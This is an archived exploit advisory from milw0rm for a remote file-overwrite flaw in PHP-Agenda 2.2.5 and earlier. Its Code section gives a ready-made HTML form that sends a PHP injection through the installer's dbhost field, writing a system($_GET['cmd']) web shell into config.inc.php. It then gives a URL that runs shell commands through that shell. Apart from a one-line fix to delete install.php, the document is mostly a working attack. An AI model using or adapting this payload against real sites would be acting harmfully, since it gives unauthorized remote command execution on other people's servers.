<html><head><title>PHP-Agenda <= 2.2.5 Remote File Overwriting Vulnerabilities</title></head><pre>*******   Salvatore &quot;drosophila&quot; Fresta   *******

[+] Application: PHP-agenda
[+] Version: &lt;= 2.2.5
[+] Website: http://php-agenda.sourceforge.net

[+] Bugs: [A] Remote File Overwriting

[+] Exploitation: Remote
[+] Date: 10 Apr 2009

[+] Discovered by: Salvatore &quot;drosophila&quot; Fresta
[+] Author: Salvatore &quot;drosophila&quot; Fresta
[+] Contact: e-mail: drosophilaxxx@gmail.com


*************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


*************************************************

[+] Bugs


- [A] Remote File Overwriting

[-] Risk: hight
[-] File affected: install.php

This bug allows a guest to overwrite config.inc.php
inserting PHP code.


*************************************************

[+] Code


- [A] Remote File Overwriting

&lt;html&gt;
  &lt;head&gt;PHP-agenda &lt;= 2.2.5 - Remote File Overwriting&lt;/head&gt;
  &lt;body&gt;
    &lt;form action=&quot;http://www.site.com/path/install.php&quot; method=&quot;post&quot;&gt;
      &lt;input type=&quot;text&quot; name=&quot;dbhost&quot; size=&quot;30&quot; value=&quot;'; system($_GET['cmd']); echo '&quot;&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Exploit!&quot; &gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/head&gt;

To execute commands:

http://www.site.com/path/config.inc.php?cmd=uname -a


*************************************************

[+] Fix

You must delete install.php after installation.


*************************************************

# milw0rm.com [2009-04-10]</pre></html>